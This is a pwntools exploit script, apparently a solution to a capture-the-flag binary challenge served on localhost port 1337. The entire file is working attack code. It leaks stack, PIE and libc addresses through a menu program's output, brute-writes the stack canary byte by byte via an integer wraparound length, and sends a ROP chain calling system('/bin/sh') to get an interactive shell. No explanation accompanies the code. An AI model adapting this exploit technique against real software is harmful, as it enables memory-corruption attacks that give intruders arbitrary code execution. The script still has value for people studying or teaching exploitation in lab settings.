from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def adde(sz,name,red):
    sla(b"choice:",b"1")
    sla(b"name:",str(sz).encode())
    if(sz):
        sa(b"giver:",name)
    sla(b"received:",str(red).encode())

def showe():
    sla(b"choice:",b"2")

def exite():
    sla(b"choice:",b"3")

def ret():
    sla(b"choice:",b"-")


adde(0x30,b"a"*0x8 + b"[LEAK1]>",0xdeadbeef)
showe()

ru(b"[LEAK1]>")
stack = u64(re(6).ljust(8,b"\x00")) - 0x58  + 0x18
print("[STACK] = ",hex(stack)) 

adde(0x30,b"a"*0x18 + b"[LEAK2]>",0xdeadbeef)
showe()

ru(b"[LEAK2]>")
pie = u64(re(6).ljust(8,b"\x00")) - 0x20a5 - 0x58 
print("[PIE] = ",hex(pie))

adde(0x30,b"a"*0x10 + b"[LEAK3]>",0xdeadbeef)
showe()

ru(b"[LEAK3]>")
libc = u64(re(6).ljust(8,b"\x00")) - 0x92ef3
print("[LIBC] = ",hex(libc))

offset = 0x3000
canaryofft = libc - offset + 0x768

length = 0xffffffffffffffff - (stack - canaryofft) + 1

print(hex(length))

for i in range (0x8):
    print(f"[DEBUG]:Done with {i}")
    adde(length + i,b"a"*0x88 + b"\x00"*(i+1),0xdeadbeef)

system = libc + 0x58750
poprdi = libc + 0x10f75b 
binsh  = libc + 0x1cb42f

ropchain = (p64(poprdi) + p64(binsh) + p64(poprdi + 1) +  p64(system))

adde(0x100,b"a"*0x88 + p64(0x0) + p64(0xc0debabe) + ropchain,0xdeadbeef)
io.interactive()
